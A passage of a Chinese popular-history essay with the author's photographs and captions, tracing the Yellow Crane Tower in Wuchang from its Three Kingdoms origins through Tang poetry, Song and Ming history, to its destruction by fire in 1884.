昌桥头。</p>\n<p>这一年，黄鹄矶上早已经没有黄鹤楼，最后一幢中式古典木结构黄鹤楼火灾毁于光绪十年。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4c6c3834b6c931c3fe1e3e05ea3a862f_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"新建黄鹤楼蛇山上面对长江后退1000米，因为长江大桥武昌端建在黄鹄矶上。这是无可奈何的事，所以新建黄鹤楼楼高五层，且每一层高度都超过古代黄鹤楼建制，为了让登临者看得远一点。让我们把今天黄鹤楼当作一座容纳古今历史文化的博物馆吧。图：站在黄鹤楼最高处看风景——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-4c6c3834b6c931c3fe1e3e05ea3a862f\" data-watermark-src=\"v2-da4c28d2f5bbb1bb714bbe9a39bb08d7\" data-private-watermark-src=\"v2-b6ca5cfadbed948d20968ff81468342d\"></p>\n<h3>三国演义夏口城</h3>\n<p>元代有一出戏《黄鹤楼》，说的是周瑜在夏口（今湖北武汉市武昌区）城楼设宴企图诱杀刘备而不成的故事，后来改编成湖北地方戏楚剧和汉剧《刘备醉走黄鹤楼》。其实这出戏与史实不合：那一年，刘备病逝永安（今四川奉节）后孙权建夏口城，周瑜去世已经十三年。</p>\n<p>黄鹤楼的来历都知道和三国历史相关，“相关”到什么程度？一般人懒得往纵深想。</p>\n<p>东汉末年，曹操、刘备、孙权在长江中游域争斗激烈，赤壁之战孙刘联盟逼进军到长江边的曹军退回汉江上游，主战场随之转移。据守荆州五郡（今湖北湖南部分地区）同时出兵攻占襄阳威胁樊城，调虎离山镇守荆州的关羽——问题是关羽根本就没意识到此一去便是人生尽头。</p>\n<p>公元219年（建安十四年），曹操和孙权联手，魏军大将徐晃攻夺襄阳，吴军主将吕蒙攻克荆州，关羽败走麦城，遭遇吴军潘璋部将埋伏被俘身死。</p>\n<p>公元220年，曹操病逝洛阳，曹丕称帝，魏国立，大汉王朝结束。</p>\n<p>公元221年，称帝蜀汉的刘备不顾丞相诸葛亮极力劝阻，重兵战船出三峡沿江而下攻打东吴为关羽报仇（史学家认为意图夺回荆州）。吴军统帅陆逊迎战， “火烧连营七百里”，夷陵（今属宜昌）大败蜀军，稳固东吴长江中游地盘。 </p>\n<p>公元222年，魏文帝曹丕率大军南征，兵分三路直奔长江，围攻江陵（今荆州）六个月，东吴将领朱然固城坚守，魏军久攻不破撤军回许昌。</p>\n<p>公元223年，刘备病逝永安（今奉节），诸葛亮派外交重臣邓芝出蜀国至武昌（今鄂州）说服吴国与蜀国联军征伐魏国。同年，吴主孙权下令在汉江和长江交汇处长江南岸建城，防备曹魏军队再次从中原长驱直入进犯东吴。</p>\n<p>新城建在蛇山（古江夏山）山脊，隔江遥对汉江入江口——当年汉江名“夏水”，所以取名夏口——从此有了武昌城。</p>\n<p>随山形地势，城墙围绕一圈，西南角楼（古代城墙转角处城楼）位于离江畔最近的黄鹄矶，站高看远，茫茫荆楚地，滚滚东逝水，天地之间尽收眼底。</p>\n<p>夏口城墙西南角最早搭建了一个简陋透空的木架高台，后来随城池加固改建为建构完备的角楼——这，就是后来名扬天下的黄鹤楼。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-65001868a8c79c0688f0a391a42895bb_720w.jpg?rss\" data-rawwidth=\"1440\" data-rawheight=\"2560\" data-size=\"normal\" data-caption=\"2021年6月1日受媒体邀请在这里参加活动——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-65001868a8c79c0688f0a391a42895bb\" data-watermark-src=\"v2-dc093afa54e49b7a5013f48dc06d4d09\" data-private-watermark-src=\"v2-d8fbd633e17eefe63fa8760fd92af9f2\"></p>\n<p>荆州之战、襄樊之战、夷陵之战、江陵之战，关羽死、张飞死、刘备死，魏蜀吴三国将帅兵卒死，长江和汉江血染满江红……四次惨烈大战换来东吴建城夏口（今武昌），黄鹤楼横空出世（当年没有名字），继续《三国演义》剩下的故事。</p>\n<p>三国中，东吴存在时间最长，前后五十九年，版图包括今湖北、湖南、江西、安徽、江苏、浙江、广西、福建，以及越南北部……</p>\n<p>比较其他因为战争需要而临时建筑的驻军营垒，夏口城（今武昌）无疑是很幸运的——历史上兵家必争之地往往也是商贸繁荣之地——军队驻扎城内，百姓聚集城外，人口众多，粮草给养、日常用度，引来大批过往商船来往交易，黄鹄矶下长江边，码头建起来了，集市搭起来了，民房盖起来了，天长日久踩成一条长街，没有战事的日子里，军人和平民，城墙上下，城墙内外，秋月春风，一杯浊酒。</p>\n<p>公元279年，晋武帝司马炎命令晋军八部分兵六路大举进攻吴国建业（今南京）、棠邑（今六合）、当涂（今当涂）、武昌（今鄂州）、夏口（今武昌）、江陵（今荆州）……天下归晋。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6da72e08a077b84f157c420460c829b1_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"三国一段历史太复杂，网上和自己都没有图片可概括，就上一副书封图吧——《三国演义》罗贯中著，人民文学出版社1955年第一版1972年第16次重印本——胡榴明藏书。\" data-watermark=\"watermark\" data-original-src=\"v2-6da72e08a077b84f157c420460c829b1\" data-watermark-src=\"v2-085bfb250b16a26d411dd95b2f0f6ae8\" data-private-watermark-src=\"v2-b5bc373e0a4ec81d9366ea791e7e3add\"></p>\n<h3>李白的诗歌唐朝</h3>\n<p>东晋、西晋、南北朝，隋朝和唐朝，400年时间漫长。</p>\n<p>推想：某一个太平年月，有人来到黄鹄矶爬上西南角楼，“啊，这地方风景真好！”于是传扬开去，慕名而来的游人逐日增多，或文人墨客或达官显贵……</p>\n<p>军事瞭望楼改风景观赏楼，黄鹤楼正式诞生，顺应时代的需要。</p>\n<p>依然围在城墙内，楼阁下高台下单开一个城门，和平时开门礼让游客，隔扇窗雕花围栏，供人凭栏远眺。战乱时闭城门森严壁垒，观赏楼还原为瞭望楼，恢复战时功能——此时此刻，登高望远，心境大不同。</p>\n<p>“高树多悲风”，每逢战乱，武昌围城，黄鹤楼被毁首当其冲（城楼下敌军阵营一根携带油棉点燃火苗的箭矢射上来就能烧毁整座瞭望楼）。</p>\n<p>唐玄宗开元十三年（公元726年），李白二十六岁，离开蜀中来到楚地（今湖北湖南），娶前朝（唐高宗）宰相许圉师的孙女为妻，十年间以安陆为中心四方游历，多次往来江夏城（今武昌），有一天在黄鹤楼上读到崔颢《题黄鹤楼》。</p>\n<p> “昔人已乘黄鹤去，此地空余黄鹤楼，黄鹤一去不复返，白云千载空悠悠，晴川历历汉阳树，芳草萋萋鹦鹉洲，日暮乡关何处问，烟波江上使人愁。”</p>\n<p>传说当时李白留下这样一句话：“眼前有景道不得，崔颢题诗在上头”，“遂无诗而去”。</p>\n<p>传说不可信：从年轻到老，李白来江夏多次登黄鹤楼多次题诗多首。</p>\n<p>传说可信：李白对崔颢的诗的确很喜欢，喜欢到非照着写一首不可，于是有了下面的诗：</p>\n<p>“凤凰台上凤凰游，凤去台空江自流。吴宫花草埋幽径，晋代衣冠成古丘。三山半落青天外，二水中分白鹭洲。总为浮云能蔽日，长安不见使人愁”（李白《登金陵凤凰台》）。</p>\n<p>从动词名词组合到声腔韵律运用，以李白一向“持才傲物”的性情来说，对旁人的诗赏识到这个地步，真的是“爱之深切”了。</p>\n<p>李白《登金陵凤凰台》推崔颢《题黄鹤楼》，无论有意还是无意。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cec489403796d9fd76fcb4e0d72afb2a_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"683\" data-size=\"normal\" data-caption=\"当年崔颢在黄鹤楼上看到的风景大抵如此图，除“忽略”当代建筑（长江大桥和龟山电视塔）外，当年（唐代）汉江入江口应在图左龟山南，现在改道至图右龟山北。图中对江汉阳江畔绿顶楼阁正是以崔颢诗意建起来的晴川阁——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-cec489403796d9fd76fcb4e0d72afb2a\" data-watermark-src=\"v2-4de6ec35f11db0b81499116908d610e1\" data-private-watermark-src=\"v2-3bb4ee960249bad1038b79d6344b0958\"></p>\n<p>从唐太宗的“贞观之治”，到唐玄宗的“开元盛世”，经济繁荣，疆域辽阔，亚洲文明的中心，四方国土来朝，包罗万象的唐文化至此抵达顶峰，诗歌文化和游冶文化随时代的兴盛而兴盛，一个思维自由创造力丰富的时代。</p>\n<p>黄鹤楼，以它得天独厚的人文地理优势，成为文人游走天下的必经之地，游山观水，登楼赋诗。</p>\n<p>公元735年（开元二十三年），孟浩然从故乡襄阳顺汉江下经江夏（今武昌）去广陵（今扬州），当天泊船黄鹄矶下，登黄鹤楼和当时闲居汉阳的李白见面然后分别。</p>\n<p>“吾爱孟夫子，风流天下闻”（李白《赠孟浩然》）。李白来楚地不久在襄阳和孟浩然认识，一直是非常要好的朋友，十年后再聚，再聚再分离。</p>\n<p>“故人西辞黄鹤楼,烟花三月下扬州，孤帆远影碧空尽，唯见长江天际流”</p>\n<p>——《黄鹤楼送孟浩然之广陵》。</p>\n<p>李白题黄鹤楼诗最通俗易懂的一首，如时下流行歌曲，亿万人传唱，你以为懂，其实你并不是很懂。</p>\n<p>天宝元年，李白奉召去长安出入宫廷伴随唐玄宗和杨贵妃认识一群诗人朋友诗酒唱和。</p>\n<p>公元755年（天宝十四年），安史之乱爆发，当时在江陵（今荆州）的李白受招募跑去永王璘麾下任幕僚。公元758年（唐肃宗乾元元年）因李璘案牵连流放夜郎（今贵州）途中经江夏（今武汉市武昌区下同）羁留将近四五个月，与汉阳（今武汉市汉阳区下同）王县令等地方官结为知交。江北汉阳城郊游湖饮酒，江南江夏（今武昌）城头登山听笛，日夜欢娱，日夜诗歌，例如《与史郎中钦听黄鹤楼上吹笛》</p>\n<p>“一为迁客去长沙，西望长安不见家。黄鹤楼中吹玉笛，江城五月落梅花”。</p>\n<p>这一次李白登黄鹤楼听《梅花落》，离上一次李白登黄鹤楼送孟浩然，时间相距三十三年。</p>\n<p>三十三年，转了一圈回到这里，人老了，旧日的朋友死了，山川依旧，物是人非，此时此刻，不知道李白心里在想什么。</p>\n<p>三十三年唐朝，太平的日子，灾难的日子，经历了太多，黄鹤楼依然立在原处。</p>\n<p>后人评价：此前黄鹤楼名气不大，自唐崔颢、李白之后名扬天下。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-adb0a703699f07a4031ec66be2b4dd2b_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"唐代黄鹤楼建筑群微缩模型。历代黄鹤楼微缩建筑模型全都陈列在今黄鹤楼四楼大厅。当天这里没有开大灯（也没有如今天好的手机和单反）拍摄效果极差——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-adb0a703699f07a4031ec66be2b4dd2b\" data-watermark-src=\"v2-97c7cc1ff580a9382d56e547eadd156f\" data-private-watermark-src=\"v2-e206e72179c5a1cfec1b2a6f4e191a6b\"></p>\n<p>永泰元年（公元765年），黄鹤楼已经是长江中游不可取代的名胜古迹游览景点（见唐·闫伯里《黄鹤楼记》）。这一年，李白去世已经三年。</p>\n<p>“永泰”，唐代宗的年号。</p>\n<p>唐代宗李豫，唐肃宗长子，安史之乱协助父亲平叛立功，以兵马大元帅身份收复长安、洛阳，立为皇太子，公元762年继位，平定内乱，改革税制，发展生产，“养民为先”，开启唐朝中兴时代。</p>\n<p>唐中期，黄鹤楼建设和江夏城（今武昌）建设比肩而行。</p>\n<p>诗人和政治家，名留史册，各有各的功绩。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5c6f3546323eabd94e8c4a3471fa1591_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"黄鹤楼大厅关于历代文人歌咏黄鹤楼的文字介绍，作为研究资料，很珍贵，所以拍照留存——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-5c6f3546323eabd94e8c4a3471fa1591\" data-watermark-src=\"v2-b8539ac5c931d15f239ed44a07d6a0e1\" data-private-watermark-src=\"v2-b893e8061fde9a3a5ff8c9f644a4cbd2\"></p>\n<p><b>岳飞《满江红》和陆游《入蜀记》</b></p>\n<p>曾经以为，南宋是一个凄哀的朝代，所有的一切都如深秋的草木枯萎凋落即将剩下支离破碎的枝条……</p>\n<p>后来知道武昌兴盛于南宋，确实很诧异。</p>\n<p>南宋王朝152年，以长江为天堑与金国南北对峙，守住半爿江山坚持这么多年还是不容易，靖康之乱后，宋军和金军在中原地区和长江沿线先后十几次惨烈战役，阻拦金军渡江，保住长江南岸农村继续耕种城市继续建设，临安（今杭州）朝廷笙箫歌舞。</p>\n<p>这样担惊受怕日夜心悬的情况下，长江流域居然成就了三个城市，扬州、镇江、鄂州（今武昌）——原因很简单，黄河流域华夏文明根基才华智慧金钱技艺思想文化全部转移到长淮之地长江南岸。乱世求太平，生产生活贸易娱乐文化教育，士农工商，该干什么干什么，哭是没有用的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-30c30aa03288a49d190138c5226f6076_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"古黄鹤楼前孔明灯，现在已经移到新建黄鹤楼面朝长江的广场上——资料图片。\" data-watermark=\"watermark\" data-original-src=\"v2-30c30aa03288a49d190138c5226f6076\" data-watermark-src=\"v2-ef631aac5d61901eafcb1e91a7db4d09\" data-private-watermark-src=\"v2-468d637f01cc1cdd7016bf9d102c53bd\"></p>\n<p>宋代鄂州（今武昌）繁华胜前朝，城墙扩大到蛇山根下，长江边黄鹤楼下城墙基下临江街市，蛇山下城墙（当时城墙圈非明清城墙圈）外南湖中央花街夜市（南草市）—— “商女不知亡国恨”，说也是白说。</p>\n<p>宋代黄鹤楼图，一副水墨，一副青绿，作者和年代均不可考。</p>\n<p>水墨《黄鹤楼卷》因年代久远墨迹模糊，望中如薄云缥缈中的仙山琼阁，重檐歇山顶，楼阁巍峨高耸。另一幅高楼雄伟，十字脊歇山顶，雕栏围绕，画廊凉亭。</p>\n<p>推测北宋时黄鹤楼不仅存在而且建筑壮观，南宋时黄鹤楼在还是不在就令人担忧了，因为上述两幅画图没有年代注明。</p>\n<p>关于南宋黄鹤楼的兴废，岳飞《满江红·登黄鹤楼有感》直接给出答案。</p>\n<p>公元1134年至公元1141年，主战派名将岳飞在鄂州（今武昌）屯兵驻守七年，以鄂州（今武昌）为基地三次北伐中原，今江汉平原（荆楚地区）和黄河中游平原（中原地区）曾经是岳家军和金军作战主战场。</p>\n<p>“遥望中原,荒烟外,许多城郭。想当年，花遮柳护,凤楼龙阁。万岁山前珠翠绕,篷壶殿里笙歌作，到而今,铁骑满郊风尘恶。兵安在？膏锋锷;民安在？填沟壑。叹江山如故,千村寥落。何日请缨提锐旅,一鞭直渡清河洛！却归来,重续汉阳游,骑黄鹤。”（岳飞《满江红·登黄鹤楼有感》）</p>\n<p>岳飞在鄂州（今武昌）期间，宋高宗（赵构）绍兴四年至绍兴十一年之间，黄鹤楼在。</p>\n<p>公元1140年，岳飞和儿子岳云率领军队从鄂州（今武昌）渡江进击中原，在郾城（今属漯河）、颍昌（今属许昌）与金军激战，进军朱仙镇途中被朝廷召回临安。失去统帅的岳家军，全军返回鄂州城，连送一步岳元帅都不可能……</p>\n<p>这是岳飞一生中最后一次领军北伐。</p>\n<p>“何日请缨提锐旅,一鞭直渡清河洛！却归来,重续汉阳游,骑黄鹤”。</p>\n<p>可是，再也归不来了。</p>\n<p>第二年（绍兴十一年）岳飞处死临安（今杭州）。宋宁宗时追封鄂王，纪念他最后几年驻兵鄂州（今武昌）。</p>\n<p>今黄鹤楼公园，蛇山脊建岳飞亭，立8米高青铜岳飞塑像，25米长青石浮雕，上刻“还我山河”岳飞手迹。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b60a57858d50b962337bcbe6b155f1c4_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"世纪钟背后不远即岳飞纪念亭，岳飞青铜像，“还我河山”巨型石刻——拍摄图片电脑里没有找到，以后有了再来这篇文章贴——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-b60a57858d50b962337bcbe6b155f1c4\" data-watermark-src=\"v2-168d28100bf68d8ebd2593c6ba50f67b\" data-private-watermark-src=\"v2-f5ffee99e0b08b0613064fb8d9b379f1\"></p>\n<p>公元1169年（乾道五年）十二月，陆游受任夔州（今重庆奉节）通判，携家人从山阴（今绍兴）乘船逆长江而上，第二年经过鄂州（今武汉市武昌区）、汉阳（今武汉市汉阳区）。</p>\n<p>陆游《入蜀记》详细描述鄂州城（今武昌）。江边：“出汉阳门江滨，城上居民市肆，数里不绝。其间复有巷陌，往来幢幢如织，盖四方商贾所集”;江面：“贾船客舫，不可胜计，衔尾者数里”;城墙内外：“市邑雄富，列肆繁错。城外南市亦数里“;“虽钱塘（今杭州）、建康（今南京）不能过，隐然一大都会”。</p>\n<p>宋代鄂州城（今武昌）以黄鹄山（今蛇山）山脚为限，军事行政机关设在山北和山脊，南城门外（今阅马场以南）南草市（当时商贸集市），南草市从长江边码头兴起向东南方发展，在南湖中间筑堤成街，商埠罗列，居民聚集。</p>\n<p>陆游途经鄂州（今武昌）这一年与岳飞驻军鄂州（今武昌）最后一年，其间相隔三十年，三十年前黄鹤楼在，三十年后黄鹤楼不在。</p>\n<p> “今楼已废，故址亦不复存”（《入蜀记》）——不仅楼毁了连遗址也毁了。</p>\n<p>这一年（乾道六年）陆游来鄂州（今武昌）游黄鹄山寻访黄鹤楼，同年鄂州城百姓在黄鹄山尾东城门外（今武昌大东门外）建忠烈庙祭祀岳将军——两件事看来毫无关联其实冥冥中相互关联。</p>\n<p>陆游一生倡议北伐一生不了其愿，“铁马冰河入梦来“，”家祭无忘告乃翁“——悲剧时代悲剧命运，英雄死，壮士老，黄鹤楼毁，历史翻过旧的一页。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e80a4af437d719929d61c4cc3d99a750_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"768\" data-size=\"normal\" data-caption=\"黄鹤楼风景区包括整整一长条蛇山山脊，在我游览的中国城市中心公园，这样构建绝无仅有，漫步在静寂的幽深的长长的山路上，古往今来的人物故事在心头漫漫涌起——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-e80a4af437d719929d61c4cc3d99a750\" data-watermark-src=\"v2-072578c42b090c90be45087760b8afdf\" data-private-watermark-src=\"v2-f381d87c5644a19ada94e0e8ca1587d4\"></p>\n<h3>锦衣卫画师安政文</h3>\n<p>公元1368年（洪武四年），江夏侯周德兴扩建湖广会城，扩大武昌城圈，蛇山南北平地例如宋代南草市一律圈进城墙内，大兴土木在蛇山上和蛇山北建造官衙府邸，同时黄鹄矶上重建黄鹤楼。</p>\n<p>公元1381年（洪武十四年），楚王朱桢分封武昌，蛇山南坡建造楚王府，八年完工，宫室巍峨，上与浮云齐，占据半个武昌城，同期修复宝通寺设为皇家寺院。</p>\n<p>公元1402年（建文四年），燕王朱棣废建文帝登帝位，永乐十九年迁都北京。</p>\n<p>永乐帝（明成祖朱棣）笃信道教到痴迷，公元1411年（永乐九年）征三十万劳力在武当山建宫殿式道教建筑，供奉北方玄武真武大帝，工程浩大，建筑华丽，十四年完工。 </p>\n<p><img src=\"https://pic4.zhimg.com/v2-c70b97dc5b28f796218c6282740140bf_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"湖北武当山明代道教建筑群之紫霄宫——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-c70b97dc5b28f796218c6282740140bf\" data-watermark-src=\"v2-8fc55909b37b1925e616b2d7fcf1d81c\" data-private-watermark-src=\"v2-c01bd758bdb04a7ed7aac4862edbbc3f\"></p>\n<p>上行下效，一时间中国各地大兴道教大建道观。永乐十二年，武昌东城门外（今武昌大东门）扩建长春观成今天规模。楚王朱桢实际行动向皇帝兄长致意。 </p>\n<p>楚王朱桢，明太祖朱元璋第六子，驻藩武昌，子孙九代王位世袭，前后273年。</p>\n<p>燕王朱棣，明太祖第四子，夺帝位后对几个兄弟“怀柔”政策。各位藩王各踞一方，小心翼翼，看永乐帝的眼色。 </p>\n<p>唐代兴佛教，明代兴道教，都是皇帝起的头。</p>\n<p>明代画师安政文《黄鹤楼雪景图》：黄鹄矶上青砖垒砌高大的台基托住黄鹤楼建筑群，主楼重檐歇山顶加两个小歇山顶，屋脊正中宝瓶，檐下斗拱密集雕花繁复，楼内雕花木围栏，楼外雕花石围栏，台基下石阶斜斜沿山坡而下穿过雕花石坊，山脚下一棵枝干虬然的古松，三三五五步行骑马的游人，楼阁上推开隔扇窗卷起竹帘撑开布篷，薄雪覆盖琉璃瓦的颜色……</p>\n<p>台基上一群人拱手向天拜揖，画面右上方烟云缥缈处隐隐约约一只鹤载一个人不知是飞去还是飞来？</p>\n<p>道教文化色彩含蓄婉转地显露在这一幅画里。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ae320ae5458aa24caf823ca714dd3c1f_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"924\" data-size=\"normal\" data-caption=\"明代宫廷画家安政文《黄鹤楼雪景图》（局部）——资料图片\" data-watermark=\"watermark\" data-original-src=\"v2-ae320ae5458aa24caf823ca714dd3c1f\" data-watermark-src=\"v2-0b443b562ebb98a3d6e095c3d1107015\" data-private-watermark-src=\"v2-458fa89d6d7ea04c78f2df74686b0308\"></p>\n<p>当时，官宦、士子、商人，来黄鹤楼除宴饮游乐外往往聚一起谈仙论道——费文伟吹笛驾黄鹤翩然而去，道教传说与黄鹤楼千百年来联系紧密。</p>\n<p>史籍记载：明代黄鹤楼建筑群华丽恢弘史无前例。</p>\n<p>画作者安政文（安正文）其人其事，历史资料查阅，除“锦衣卫千户安政文”寥寥数字别无记载。</p>\n<p>锦衣卫，明太祖朱元璋设立于洪武十五年，先是直属皇上管理的亲兵侍卫队，后来职责范围扩大，秘密特工、独立执法，奉皇上命令监控群臣，一人之下、万人之上的朝廷私家军队。明洪武二十五年废除。明成祖朱棣在位时恢复建制并发展壮大。</p>\n<p>明永乐年间，征天下画艺高绝的人入宫，在文渊阁和武英殿遵皇上旨意绘画。明朝是宫廷画师最兴盛的朝代。</p>\n<p>永乐十五年，明成祖指示画师兼军职，入职锦衣卫，例如锦衣卫百户或锦衣卫千户画师不等。绘画本行，军职虚衔，待遇优厚，以示皇上对画师的“恩宠”。</p>\n<p>画师兼军职由永乐帝开始，但锦衣卫千户安政文并不一定是永乐年间人。</p>\n<p>明成祖后，宫廷画师兼职锦衣卫制度沿袭，宣德、成化、弘治，宫廷绘画抵达顶峰，直到明中期后江浙文人画兴起，民间绘画大家诞生，宫廷画派日趋没落。</p>\n<p>2006年版《中国古代绘画中的建筑与环境》（王其均著、中国建工出版社），其中《明代绘画中的楼阁建筑》一章，以安政文为明代建筑绘画代表，收入他《黄鹤楼雪景图》和《岳阳楼图》。</p>\n<p>安政文《黄鹤楼图》，想象和现实重叠，其中可能有依实景描摹的部分，也许武昌楚王请他来楚王宫作画，也许京城皇帝派他来武昌作画——总之，画留下来了，画的意义就不仅仅只是画了。</p>\n<p><sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"1\" data-text=\"关于安政文锦衣卫身份问题，写这篇文章时在网上查到几篇学术资料有简略介绍。特谢！\" data-url=\"\">[1]</sup></p>\n<h3>汉江揽胜图</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-c549661201756069215e19660854d6bf_720w.jpg?rss\" data-rawwidth=\"612\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"《汉江揽胜图》另一仿品，作者佚名——我手头有《汉江揽胜图》原版影印本，与此图相似但诸多不同，总的印象是更为金碧辉煌一些，除此图武昌黄鹤楼半幅外，还有另外半幅汉阳晴川阁和汉口汉正街（原版藏于武汉市博物馆），因为不属于我（指影印件），就不方便拿到网上来——历史资料图片胡榴明藏品\" data-watermark=\"watermark\" data-original-src=\"v2-c549661201756069215e19660854d6bf\" data-watermark-src=\"v2-f4a99c9a250770021b21277203db1266\" data-private-watermark-src=\"v2-9a928c0c9ca9541454f9aa41cc112952\"></p>\n<p>古武昌城，沿市区周边筑一圈高而厚的城墙，东南西北，四方八面，九个城门，固若金汤，城内是官衙是学府是商埠是民居，城外是田地是田原是山岭是湖泊……</p>\n<p>武昌河街（今临江大道）沿长江岸延伸，四方生意，八方来客，三江五湖的船停泊江边码头，沿街店铺，门朝长江，背靠城墙，黄鹄矶在城墙内，黄鹤楼在山崖上。</p>\n<p>长江北岸汉阳古城，建城历史早于夏口，长江中游商业重镇，汉江入长江口自古以来军事商贸要冲，平常时日舟车行旅贸易繁忙。</p>\n<p>明嘉靖二十六年（1547年），汉阳知府范之箴主持修缮禹稷行宫（禹王庙）。东北侧长江边建晴川阁，楼阁正面与对岸黄鹤楼遥遥相对，因崔颢《登黄鹤楼》诗：“晴川历历汉阳树”立意得名。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e216b4b5654a015d22ebbb1b78a967ef_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"379\" data-size=\"normal\" data-caption=\"黄鹤楼隔江遥对晴川阁，因为崔颢的诗《黄鹤楼》。汉阳晴川阁明代建筑——资料图片\" data-watermark=\"watermark\" data-original-src=\"v2-e216b4b5654a015d22ebbb1b78a967ef\" data-watermark-src=\"v2-f10eba107eb809b2a48c76cd3a4d0b66\" data-private-watermark-src=\"v2-9753c4782a56b419b17c65d17fea3352\"></p>\n<p>明成化年（1487年），汉水改道，由龟山北注入长江，天长日久，沙泥淤积有了汉口。</p>\n<p>汉口，隔汉江与汉阳相对，隔长江与武昌相对，扼长江、汉水两大水道的咽喉，东西南北交汇要冲，舟车商旅经行往复，明中叶时，与河南朱仙镇、广东佛山镇、江西景德镇，并称中华“四大名镇”。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1fa4b0e7dae9c2711ad3ead9f833a2e1_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1920\" data-size=\"normal\" data-caption=\"历史上最后一座木建构黄鹤楼毁于1861年汉口开埠之后。图：汉口海关江汉关，武汉三镇从农耕时代进入工业时代的分界岭——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-1fa4b0e7dae9c2711ad3ead9f833a2e1\" data-watermark-src=\"v2-927e2ef65565f244fc659f61472435db\" data-private-watermark-src=\"v2-5407cebe204c6f6b882ef0d7390d4166\"></p>\n<p>《汉江揽胜图》，将武汉三镇尽收眼底。</p>\n<p>长江和汉江交汇，图左武昌古城，图右汉阳古城，那年鹦鹉洲还在长江中央，画作者站在汉江入江口汉口龙王庙高台上。</p>\n<p>武昌风景名胜黄鹤楼，汉阳风景名胜晴川阁，当年汉口年轻，没有名胜古迹（其实有晚清龙王庙，和黄鹤楼和晴川阁比年代不算古影响也不算大）。</p>\n<p>武昌西城门正对汉阳取名汉阳门，黄鹄矶位于汉阳门西南，画中黄鹤楼远远望去和清同治楼建筑式样没有区别。</p>\n<p>《汉江揽胜图》，意在气势，不在意技法，属山川地理图，不属山水风景图，看得出画家对图中山石草木没有兴趣，对江河流向城市建筑方位比较着意，技法依然虚实结合，例如想象自己站在龙王庙前长江边的高处观赏两江交汇百舸争流的风景，为后人留下清晚期武汉三镇进入现代化之前的历史痕迹。</p>\n<p>但是，和明代画家仇英扯不上关系。</p>\n<p>仇英，明弘治至明嘉靖人，年少时开始绘画，一生画作留传下来的很多，工水墨山水和青绿山水，其中山水建筑图多半云烟缭绕山石劲峭屋舍或精细或随意远处近处的林木几乎每一片叶子都是有生命的……</p>\n<p>五百年前的中国画，古风沉郁悠远几乎与世隔绝，后世人（指当时清晚期）模仿不来。</p>\n<h2>没有黄鹤楼的悠长岁月</h2>\n<p>清同治四年（1865年），湖广总督官文和湖北巡抚郭伯荫主持重建黄鹤楼，两年后建成，三层四望、翘角飞檐、八面攒尖顶，沿袭清代以来样式，虽然规模不能相比，人称同治楼。国运兴衰，楼阁兴衰。不一定应合准确，表达人们对天下太平、国家兴盛的期望。</p>\n<p>湖广总督官文，满洲正白旗人，武官出身，军功显赫，和平时期在武汉做了两件历史上必得书写的事：1861年和英国人协议“汉口开埠”，1868年主持重修战乱中被毁的黄鹤楼。</p>\n<p>可惜，天不遂人愿，十七年后，同治楼毁。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7f543ed91a52238812348efe258725e6_720w.jpg?rss\" data-rawwidth=\"610\" data-rawheight=\"551\" data-size=\"normal\" data-caption=\"同治黄鹤楼，当代新建黄鹤楼建筑样式摹本，比较宋代和明代清代早期黄鹤楼，同治黄鹤楼楼体及建筑群规模缩减，因为进入王朝衰败时期——历史资料照片\" data-watermark=\"watermark\" data-original-src=\"v2-7f543ed91a52238812348efe258725e6\" data-watermark-src=\"v2-0fcc2aadd2b5e8b682a3a78411629694\" data-private-watermark-src=\"v2-47cabeccba75b70b0aefeea11e7566c8\"></p>\n<p>清光绪十年（1884年）八月，武昌城墙根下一家店铺发生火灾，火焰窜出屋顶窜上黄鹄矶，当天北风肆虐（季风气候的长江中游，竟然盛夏起北风，天毁黄鹤楼也），江面空阔无阻挡，风助火势，长江南岸火光绵延，同治楼焚毁旦夕之间。</p>\n<p>中国建筑史最后一幢木构架古建筑黄鹤楼毁掉了。自后一百年，长江江畔黄鹄矶上残垣颓壁苍凉萧索——“落日江流带女墙,飞楼百尺俯苍茫”的意境，从今往后只能去古人诗画中找。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6356c5d4e99062bd7061a413deb64d89_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"720\" data-size=\"normal\" 